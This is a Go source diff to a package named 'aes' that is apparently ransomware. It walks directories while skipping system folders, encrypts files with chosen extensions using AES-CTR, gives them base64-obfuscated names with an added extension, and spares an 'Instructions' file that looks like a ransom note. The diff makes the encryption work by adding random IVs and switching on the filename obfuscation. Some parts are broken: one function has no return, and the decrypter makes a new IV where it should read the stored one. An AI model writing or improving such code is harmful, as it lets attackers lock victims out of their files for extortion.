@@ -3,11 +3,14 @@ package aes
 import (
 	"crypto/aes"
 	"crypto/cipher"
+	"crypto/rand"
+	"fmt"
 	"io"
-	"io/ioutil"
 	"os"
 	"path/filepath"
 	"strings"
+
+	"../base64"
 )
 
 var plaintext []byte
@@ -34,9 +37,6 @@ var badfolders = []string{"tmp", "winnt", "Application Data", "AppData",
 }
 
 var block cipher.Block
-var iv [aes.BlockSize]byte
-var stream cipher.Stream
-var targetFileName string
 var key []byte
 
 // Ext is the encrypted appended extension
@@ -62,19 +62,23 @@ func EncryptDocumets(path string, mode bool) {
 }
 
 // InitializeBlock Sets up the encription with a key
-func InitializeBlock(myKey []byte, tfn string) {
+func InitializeBlock(myKey []byte) {
 	key = myKey
-	block, err := aes.NewCipher(key)
+	block, _ = aes.NewCipher(key)
+
+}
+func initIV() (stream cipher.Stream, iv []byte) {
+	iv = make([]byte, aes.BlockSize)
+	_, err := rand.Read(iv)
 	if err != nil {
-		panic(err)
+		fmt.Println("error:", err)
+		return
 	}
-	/*for index, b := range myIv {
-
-		iv[index] = b
-
-	}*/
 	stream = cipher.NewCTR(block, iv[:])
-	targetFileName = tfn
+	return stream, iv
+}
+func initWithIV(myIv []byte) cipher.Stream {
+	stream = cipher.NewCTR(block, myIv[:])
 }
 
 func visit(path string, f os.FileInfo, err error) error {
@@ -83,7 +87,7 @@ func visit(path string, f os.FileInfo, err error) error {
 			return nil
 		}
 	}
-	if !strings.Contains(path, Ext) && !strings.Contains(path, "Instructions") && !strings.Contains(path, targetFileName) {
+	if !strings.Contains(path, Ext) && !strings.Contains(path, "Instructions") {
 		for _, ext := range exts {
 			if strings.Contains(path, ext) {
 				StreamEncrypter(path)
@@ -105,18 +109,22 @@ func visitD(path string, f os.FileInfo, err error) error {
 func StreamDecrypter(path string) (err error) {
 	inFile, err := os.Open(path)
 	if err != nil {
-		//Couldn't open file, maybe a folder
+		fmt.Println("error:", err)
 		return
 	}
 
-	outFile, err := os.OpenFile(filenameDeobfuscator(path+"d"), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0777)
+	deobfPath := filenameDeobfuscator(path)
+	outFile, err := os.OpenFile(deobfPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0777)
 	if err != nil {
 		return
 	}
 	defer outFile.Close()
+	// TODO Change
+	stream, _ := initIV()
+
 	reader := &cipher.StreamReader{S: stream, R: inFile}
 	if _, err = io.Copy(outFile, reader); err != nil {
-		panic(err)
+		fmt.Println(err)
 	}
 	inFile.Close()
 
@@ -128,17 +136,25 @@ func StreamDecrypter(path string) (err error) {
 func StreamEncrypter(path string) (err error) {
 	inFile, err := os.Open(path)
 	if err != nil {
-		return
-	}
-	outFile, err := os.OpenFile(filenameObfuscator(path+"e"), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0777)
-	if err != nil {
+		fmt.Println(err)
 		return
 	}
 
+	obfuscatePath := filenameObfuscator(path)
+	outFile, err := os.OpenFile(obfuscatePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0777)
+	fmt.Println(outFile.Name())
+
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+
+	stream, iv := initIV()
+	outFile.Write(iv)
 	writer := &cipher.StreamWriter{S: stream, W: outFile}
 
 	if _, err = io.Copy(writer, inFile); err != nil {
-		panic(err)
+		fmt.Println(err.Error())
 	}
 	inFile.Close()
 	outFile.Close()
@@ -147,16 +163,15 @@ func StreamEncrypter(path string) (err error) {
 }
 
 func filenameObfuscator(path string) string {
-	/*filenameArr := strings.Split(path, string(os.PathSeparator))
+	filenameArr := strings.Split(path, string(os.PathSeparator))
 	filename := filenameArr[len(filenameArr)-1]
 	path2 := strings.Join(filenameArr[:len(filenameArr)-1], string(os.PathSeparator))
 
-	return path2 + string(os.PathSeparator) + base64.Encode(filename) + Ext*/
-	return path
+	return path2 + string(os.PathSeparator) + base64.Encode(filename) + Ext
 
 }
 func filenameDeobfuscator(path string) string {
-	/*//get the path for the output
+	//get the path for the output
 	opPath := strings.Trim(path, Ext)
 	// Divide filepath
 	filenameArr := strings.Split(opPath, string(os.PathSeparator))
@@ -164,87 +179,5 @@ func filenameDeobfuscator(path string) string {
 	filename := filenameArr[len(filenameArr)-1]
 	// get parent dir
 	path2 := strings.Join(filenameArr[:len(filenameArr)-1], string(os.PathSeparator))
-	return path2 + string(os.PathSeparator) + base64.Decode(filename)*/
-	return path
-}
-
-//////////////////// EXAMPLES
-
-func ExampleStreamReader() {
-	key := []byte("example key 1234")
-
-	inFile, err := os.Open("encrypted-file")
-	if err != nil {
-		panic(err)
-	}
-	defer inFile.Close()
-
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		panic(err)
-	}
-
-	// If the key is unique for each ciphertext, then it's ok to use a zero
-	// IV.
-	var iv [aes.BlockSize]byte
-	stream := cipher.NewCTR(block, iv[:])
-
-	outFile, err := os.OpenFile("decrypted-file2", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
-	if err != nil {
-		panic(err)
-	}
-	defer outFile.Close()
-
-	reader := &cipher.StreamReader{S: stream, R: inFile}
-	// Copy the input file to the output file, decrypting as we go.
-	if _, err := io.Copy(outFile, reader); err != nil {
-		panic(err)
-	}
-
-	// Note that this example is simplistic in that it omits any
-	// authentication of the encrypted data. If you were actually to use
-	// StreamReader in this manner, an attacker could flip arbitrary bits in
-	// the output.
-}
-
-func ExampleStreamWriter() {
-	input1 := []byte("ooooooooooooooooooooo")
-	tempDir, _ := filepath.Abs(filepath.Dir(os.Args[0]))
-	// Write some files
-	err := ioutil.WriteFile(tempDir+"/plaintext-file", input1, 0777)
-
-	key := []byte("example key 1234")
-
-	inFile, err := os.Open("plaintext-file")
-	if err != nil {
-		panic(err)
-	}
-	defer inFile.Close()
-
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		panic(err)
-	}
-
-	// If the key is unique for each ciphertext, then it's ok to use a zero
-	// IV.
-	var iv [aes.BlockSize]byte
-	stream := cipher.NewCTR(block, iv[:])
-
-	outFile, err := os.OpenFile("encrypted-file", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
-	if err != nil {
-		panic(err)
-	}
-	defer outFile.Close()
-
-	writer := &cipher.StreamWriter{S: stream, W: outFile}
-	// Copy the input file to the output file, encrypting as we go.
-	if _, err := io.Copy(writer, inFile); err != nil {
-		panic(err)
-	}
-
-	// Note that this example is simplistic in that it omits any
-	// authentication of the encrypted data. If you were actually to use
-	// StreamReader in this manner, an attacker could flip arbitrary bits in
-	// the decrypted result.
+	return path2 + string(os.PathSeparator) + base64.Decode(filename)
 }
